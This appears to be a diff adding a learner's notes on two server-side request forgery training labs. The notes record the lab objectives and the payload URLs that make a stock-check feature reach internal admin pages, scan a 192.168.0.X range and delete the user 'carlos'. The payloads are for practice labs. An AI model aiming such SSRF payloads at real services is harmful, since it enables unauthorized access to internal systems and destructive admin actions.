@@ -1,0 +1,40 @@
+Lab 01: Basic SSRF against the local server
+
+Objectives:
+
+- stock check feature fetches data from an internal system
+- Find http://localhost/admin and delete user 'carlos'
+
+Analysis:
+
+1. Find http requests to other systems (checking stock, etc..)
+
+http://stock.weliketoshop.net:8080/product/stock/check?productId=1&storeId=1
+
+http://stock.weliketoshop.net:8080/product/stock/check?productId=1&storeId=1
+
+http://localhost/admin/delete?username=carlos
+
+http://localhost/admin/delete?username=wiener
+
+
+========Lab02: Basic SSRF against another back-end system ===
+
+Objectives:
+
+stock check feature fetches data from internal system
+
+Use stock check feature to scan internal range: 192.168.0.X:8080/admin
+
+Delete user carlos
+
+Analysis:
+
+- Find request to internal IP
+- Find intneral host with 192.168.0.X:8080/admin
+
+http%3A%2F%2F192.168.0.1%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D1%26storeId%3D1
+
+http://192.168.0.1:8080/admin/
+
+http://192.168.0.193:8080/admin/delete?username=carlos
